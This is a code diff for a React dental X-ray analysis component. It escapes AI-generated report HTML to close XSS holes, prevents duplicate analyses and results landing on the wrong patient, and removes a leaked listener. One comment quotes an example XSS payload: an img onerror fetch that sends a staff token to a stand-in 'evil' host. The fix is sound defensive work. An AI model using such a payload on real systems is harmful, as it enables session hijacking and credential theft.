@@ -72,8 +72,27 @@ const AI_TO_ODONTOGRAM: Record<string, ToothStatus> = {
 
 // ─── Markdown-рендерер (лёгкий, без зависимостей) ────────────────────────────
 
+/**
+ * Экранирование HTML перед подстановкой в разметку.
+ *
+ * ЗАЧЕМ: renderMarkdown ниже отдаётся в dangerouslySetInnerHTML, а на вход
+ * получает отчёт AI-модели (поле aiReport, приходит с сервера). Без
+ * экранирования любой тег из ответа модели исполнялся в сессии врача —
+ * например `<img src=x onerror="fetch('//evil/?t='+localStorage.dente_staff_token)">`
+ * увёл бы токен сотрудника. Экранируем ДО markdown-замен, чтобы теги,
+ * которые генерируем мы сами, остались рабочими.
+ */
+export function escapeHtml(value: string): string {
+  return String(value)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
 function renderMarkdown(text: string): string {
-  return text
+  return escapeHtml(text)
     .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
     .replace(/\*(.+?)\*/g, '<em>$1</em>')
     .replace(/^#{1,3}\s+(.+)$/gm, '<h4 style="margin:12px 0 4px">$1</h4>')
@@ -134,6 +153,10 @@ export function VisiographAnalyzer() {
   const fileInputRef = useRef<HTMLInputElement>(null);
   const dropRef = useRef<HTMLDivElement>(null);
   const synthRef = useRef<SpeechSynthesis | null>(null);
+  // Признак «анализ идёт» именно в ref: значение из useState попадает в замыкание
+  // useCallback и устаревает, поэтому два быстрых перетаскивания подряд оба
+  // прошли бы проверку и запустили два платных вызова ИИ.
+  const analysisInFlightRef = useRef(false);
 
   const { selectedPatientId, setToothStatus } = usePatientStore();
 
@@ -158,7 +181,12 @@ export function VisiographAnalyzer() {
     const setReady = () => setVoicesReady(true);
     if (synth.getVoices().length > 0) setReady();
     else synth.addEventListener('voiceschanged', setReady, { once: true });
-    return () => { synth.cancel(); };
+    // Слушатель с { once: true } не снимается, если событие так и не произошло:
+    // при размонтировании он остаётся висеть на глобальном speechSynthesis.
+    return () => {
+      synth.removeEventListener('voiceschanged', setReady);
+      synth.cancel();
+    };
   }, []);
 
   // ── Load scan history when patient changes ──────────────────────────────
@@ -192,6 +220,15 @@ export function VisiographAnalyzer() {
       setError('Поддерживаются только изображения (JPG, PNG, BMP, TIFF).');
       return;
     }
+    // Повторный запуск во время анализа приводил ко второму платному вызову ИИ,
+    // а первый finally гасил индикатор, пока второй ещё считал.
+    if (analysisInFlightRef.current) return;
+    analysisInFlightRef.current = true;
+
+    // Анализ занимает 10–25 секунд. За это время врач может переключиться на
+    // другого пациента — а результат записывался в ТОГО, кто открыт СЕЙЧАС.
+    // Запоминаем пациента на старте и сверяем перед записью.
+    const patientAtStart = selectedPatientId ?? null;
 
     setIsAnalyzing(true);
     setError(null);
@@ -246,6 +283,15 @@ export function VisiographAnalyzer() {
       const aiResult = await aiRes.json() as { report: string; toothStates: Record<string, string>; warnings: string[] };
 
       // 4. Apply to Odontogram
+      // Пациент сменился, пока считал ИИ — результат чужой, применять нельзя.
+      const patientNow = usePatientStore.getState().selectedPatientId ?? null;
+      if (patientAtStart !== patientNow) {
+        setError(
+          'Пациент был изменён во время анализа. Результат не применён к зубной формуле — откройте снимок нужного пациента и повторите.',
+        );
+        return;
+      }
+
       if (aiResult.toothStates && Object.keys(aiResult.toothStates).length > 0) {
         for (const [code, state] of Object.entries(aiResult.toothStates)) {
           const toothNum = parseInt(code, 10);
@@ -310,6 +356,7 @@ export function VisiographAnalyzer() {
       console.error('[VisiographAnalyzer] Error:', err);
       setError(err.message || 'Не удалось проанализировать снимок. Проверьте подключение.');
     } finally {
+      analysisInFlightRef.current = false;
       setIsAnalyzing(false);
       if (fileInputRef.current) fileInputRef.current.value = '';
     }
@@ -319,6 +366,8 @@ export function VisiographAnalyzer() {
   const handleDrop = useCallback((e: React.DragEvent) => {
     e.preventDefault();
     setIsDragOver(false);
+    // Проверка isAnalyzing есть внутри processFile — второй снимок,
+    // бросенный во время анализа, больше не запускает параллельный разбор.
     const file = e.dataTransfer.files?.[0];
     if (file) processFile(file);
   }, [processFile]);
@@ -369,6 +418,9 @@ export function VisiographAnalyzer() {
     if (!currentScan?.aiReport) return;
     const win = window.open('', '_blank');
     if (!win) return;
+    // Отчёт модели экранируется: `<pre>` НЕ нейтрализует теги, и до этого
+    // исправления содержимое aiReport исполнялось как HTML в том же origin,
+    // что и приложение (XSS через окно печати).
     win.document.write(`
       <html><head><title>AI Отчёт · ShadowAnalyst</title>
       <style>body{font-family:Arial,sans-serif;padding:24px;max-width:700px;margin:0 auto}
@@ -376,8 +428,8 @@ export function VisiographAnalyzer() {
       pre{white-space:pre-wrap;font-family:inherit;font-size:14px;line-height:1.6}</style>
       </head><body>
       <h1>ИИ-Анализ 2D-снимка · ShadowAnalyst</h1>
-      <p style="color:#666;font-size:12px">Дата: ${new Date(currentScan.capturedAt).toLocaleDateString('ru-RU')}</p>
-      <pre>${currentScan.aiReport}</pre>
+      <p style="color:#666;font-size:12px">Дата: ${escapeHtml(new Date(currentScan.capturedAt).toLocaleDateString('ru-RU'))}</p>
+      <pre>${escapeHtml(currentScan.aiReport)}</pre>
       </body></html>
     `);
     win.document.close();
